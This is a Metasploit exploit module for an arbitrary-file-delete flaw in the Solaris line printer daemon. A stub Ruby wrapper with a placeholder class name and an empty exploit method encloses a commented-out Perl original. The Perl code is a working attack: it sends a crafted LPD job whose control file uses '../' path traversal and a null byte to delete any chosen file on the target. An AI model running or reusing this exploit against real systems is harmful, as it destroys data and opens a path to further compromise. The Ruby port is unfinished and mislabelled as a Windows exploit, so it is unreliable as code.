require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris LPD Arbitrary File Delete',
			'Description'    => %q{
				This module uses a vulnerability in the Solaris line printer
				daemon to delete arbitrary files on an affected system. This
				can be used to exploit the rpc.walld format string flaw, the
				missing krb5.conf authentication bypass, or simple delete
				system files. Tested on Solaris 2.6, 7, 8, 9, and 10.
					
			},
			'Author'         => [ 'hdm', 'Optyx <optyx@uberhax0r.net>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-26-101842-1'],

				],
			'Privileged'     => true,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'solaris',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_lpd_unlink;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'		=> 'Solaris LPD Arbitrary File Delete',
	'Version'	=> '$Revision$',
	'Authors'	=>
	  [
		'H D Moore <hdm [at] metasploit.com>',
		'Optyx <optyx [at] uberhax0r.net>'
	  ],

	'Arch'		=> [ ],
	'OS'		=> [ 'solaris' ],

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The LPD server port', 515],
		'RPATH' => [1, 'DATA', 'The remote path name to delete'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module uses a vulnerability in the Solaris line printer daemon
	to delete arbitrary files on an affected system. This can be used to exploit
	the rpc.walld format string flaw, the missing krb5.conf authentication bypass,
	or simple delete system files. Tested on Solaris 2.6, 7, 8, 9, and 10. 
}),

	'Refs'  =>
	  [
		['URL', 'http://sunsolve.sun.com/search/document.do?assetkey=1-26-101842-1'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [['No Target Needed']],

	'Keys'  => ['lpd'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('RPATH');
	my $res;

	# We use one connection to configure the spool directory
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	# Send a job request that will trigger the cascade adaptor (thanks Dino!)
	$s->Send("\x02"."metasploit:framework\n");
	$res = $s->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our job request command");
		return;
	}

	# The job ID is squashed down to three decimal digits
	my $jid = ($$ % 1000).unpack("H*",pack('N', time() + $$));

	# Create a simple control file...
	my $control = "Hmetasploit\nPr00t\n";

	# Theoretically, we could delete multiple files at once, however
	# the lp daemon will append garbage from memory to the path name
	# if we don't stick a null byte after the path. Unfortunately, this
	# null byte will prevent the parser from processing the other paths.
	$control .= "U".("../" x 10)."$target_path\x00\n";

	my $dataf = "http://metasploit.com/\n";

	$self->PrintLine("[*] Sending the malicious cascaded job request...");
	if ( ! $self->SendFile($s, 2, "cfA".$jid."metasploit", $control) ||
		! $self->SendFile($s, 3, "dfa".$jid."metasploit", $dataf)  ||
		0
	  ) { $s->Close; return }

	$self->PrintLine('');
	$self->PrintLine("[*] Successfully deleted $target_path >:-]");
	return;
}

sub SendFile {
	my $self = shift;
	my $sock = shift;
	my $type = shift;
	my $name = shift;
	my $data = shift;

	$sock->Send(chr($type) .length($data). " $name\n");
	my $res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file command ($name)");
		return;
	}

	$sock->Send($data);
	$sock->Send("\x00");
	$res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file data ($name)");
		return;
	}

	$self->PrintLine(sprintf("[*]     Uploaded %.4d bytes >> $name", length($data)));
	return 1;
}

1;

=end


end
end	
